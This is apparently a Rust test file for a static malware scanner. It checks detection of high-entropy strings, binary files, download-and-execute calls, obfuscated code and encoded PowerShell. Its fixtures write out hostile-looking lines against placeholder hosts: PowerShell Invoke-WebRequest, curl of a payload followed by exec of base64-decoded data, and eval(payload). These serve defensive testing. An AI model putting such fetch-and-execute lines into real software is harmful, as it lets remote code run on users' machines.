use super::*;
use crate::rules::built_in_rules;

#[test]
fn all_built_in_tree_sitter_queries_compile() {
    validate_rules(&built_in_rules()).unwrap();
}

#[test]
fn structured_literal_detection_is_composable_and_case_insensitive() {
    let structured = [
        "https://example.com/resource",
        "Fetch from https://example.com/resource with the supplied token",
        "select token from sessions where active = true",
        r"r'^(?:[a-z]+)$'",
        "User {user_id:08x} requested {resource}",
        "This is ordinary documentation.",
    ];
    let opaque = [
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        "a string with no structural markers",
    ];

    for value in structured {
        assert!(
            super::is_structured_literal(value),
            "expected structured: {value}"
        );
    }
    for value in opaque {
        assert!(
            !super::is_structured_literal(value),
            "expected opaque: {value}"
        );
    }
}

#[test]
fn scanner_reports_only_high_entropy_string_literals() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("entropy.py"),
        concat!(
            "ordinary = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n",
            "alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'\n",
            "borderline = 'aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqrstuvwxyzABCDEF'\n",
            "opaque = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "url = 'https://example.com/api/v1/items?query=abcdefghijklmnopqrstuvwxyz0123456789'\n",
            "embedded_url = 'callback=https://example.com/api/v1/items?token=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n",
            "regex = r'^(?:[A-Za-z0-9._%+-]+)@(?:[A-Za-z0-9.-]+)\\\\.[A-Za-z]{2,}$'\n",
            "sql = 'SELECT account_id, display_name, email_address FROM users WHERE status = \'active\''\n",
            "format_string = 'User {user_id:08x} requested {resource_name} at {timestamp:%Y-%m-%d}'\n",
            "documentation = 'This documentation sentence describes ordinary usage and should not be treated as opaque.'\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let entropy_findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "PY_HIGH_ENTROPY_STRING")
        .collect::<Vec<_>>();

    assert_eq!(entropy_findings.len(), 1);
    assert!(
        entropy_findings[0]
            .matched_code
            .contains("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
    );
}

#[test]
fn scanner_exempts_binary_and_compressed_test_fixtures_only() {
    let directory = tempfile::tempdir().unwrap();
    fs::create_dir_all(directory.path().join("tests/fixtures")).unwrap();
    fs::create_dir_all(directory.path().join("tests/io/data")).unwrap();
    fs::create_dir_all(directory.path().join("src/data")).unwrap();
    fs::write(
        directory.path().join("tests/fixtures/fixture.bin"),
        [0, 1, 2, 3],
    )
    .unwrap();
    fs::write(
        directory.path().join("tests/fixtures/fixture.gz"),
        [0x1f, 0x8b, 0, 1],
    )
    .unwrap();
    fs::write(
        directory.path().join("tests/io/data/sample.bin"),
        [0, 1, 2, 3],
    )
    .unwrap();
    fs::write(directory.path().join("tests/sample.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("src/data/sample.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("payload.bin"), [0, 1, 2, 3]).unwrap();
    fs::write(directory.path().join("payload.gz"), [0x1f, 0x8b, 0, 1]).unwrap();

    let outcome = scan(directory.path(), "root", &[], &EngineLimits::default()).unwrap();
    let findings = outcome
        .findings
        .iter()
        .map(|finding| (finding.rule_id.as_str(), finding.file.as_path()))
        .collect::<Vec<_>>();

    assert!(findings.contains(&("FILE_BINARY", Path::new("payload.bin"))));
    assert!(findings.contains(&("FILE_COMPRESSED", Path::new("payload.gz"))));
    assert!(findings.contains(&("FILE_BINARY", Path::new("tests/sample.bin"))));
    assert!(findings.contains(&("FILE_BINARY", Path::new("src/data/sample.bin"))));
    assert!(!findings.iter().any(|(_, path)| {
        *path == Path::new("tests/io/data/sample.bin") || path.starts_with("tests/fixtures")
    }));
}

#[test]
fn download_execution_rule_requires_a_powershell_payload() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("commands.py"),
        concat!(
            "import subprocess\n",
            "subprocess.run(['powershell.exe', '-command', 'Get-Clipboard'])\n",
            "subprocess.run(['powershell.exe', '-command', 'Invoke-WebRequest https://example.invalid/payload'])\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "GD_THREAT_PROCESS_DOWNLOAD_EXEC_PY")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert!(findings[0].matched_code.contains("Invoke-WebRequest"));
}

#[test]
fn scanner_ignores_character_formatting_as_obfuscation() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("format.js"),
        concat!(
            "const formatted = String.fromCharCode(parseInt(arg, 10))\n",
            "const decoded = String.fromCharCode(72, 101, 108, 108, 111)\n",
        ),
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let findings = outcome
        .findings
        .iter()
        .filter(|finding| finding.rule_id == "JS002")
        .collect::<Vec<_>>();

    assert_eq!(findings.len(), 1);
    assert!(findings[0].matched_code.contains("72, 101"));
}

#[test]
fn scanner_reports_tree_sitter_guarddog_equivalents() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(
        directory.path().join("payload.py"),
        concat!(
            "import base64\n",
            "import subprocess\n",
            "subprocess.run(['curl', 'https://example.invalid/payload'])\n",
            "exec(base64.b64decode(payload))\n",
        ),
    )
    .unwrap();
    fs::write(
        directory.path().join("payload.js"),
        "child_process.exec('powershell -EncodedCommand QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')\n",
    )
    .unwrap();

    let outcome = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let rule_ids = outcome
        .findings
        .iter()
        .map(|finding| finding.rule_id.as_str())
        .collect::<HashSet<_>>();

    assert!(rule_ids.contains("GD_CAPABILITY_NETWORK_LOLBAS_PY"));
    assert!(rule_ids.contains("GD_THREAT_RUNTIME_OBFUSCATION_BASE64EXEC_PY"));
    assert!(rule_ids.contains("GD_THREAT_PROCESS_POWERSHELL_ENCODED_JS"));
}

#[test]
fn scanner_bounds_non_source_reads_but_preserves_file_analysis() {
    let directory = tempfile::tempdir().unwrap();
    let mut bytes = vec![0; (super::MAX_NON_SOURCE_ANALYSIS_BYTES as usize) + 1];
    bytes[0] = 0;
    fs::write(directory.path().join("large.bin"), &bytes).unwrap();

    let outcome = scan(directory.path(), "root", &[], &EngineLimits::default()).unwrap();

    let finding = outcome
        .findings
        .iter()
        .find(|finding| finding.rule_id == "FILE_BINARY")
        .unwrap();
    assert!(finding.matched_code.contains("size: 1048577 bytes"));
    assert_eq!(outcome.scanned_files, 0);
}

#[test]
fn scanner_reports_stable_relative_locations() {
    let directory = tempfile::tempdir().unwrap();
    fs::write(directory.path().join("bad.py"), "eval(payload)\n").unwrap();
    let first = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    let second = scan(
        directory.path(),
        "root",
        &built_in_rules(),
        &EngineLimits::default(),
    )
    .unwrap();
    assert_eq!(first.findings[0].id, second.findings[0].id);
    assert_eq!(first.findings[0].file, PathBuf::from("bad.py"));
}
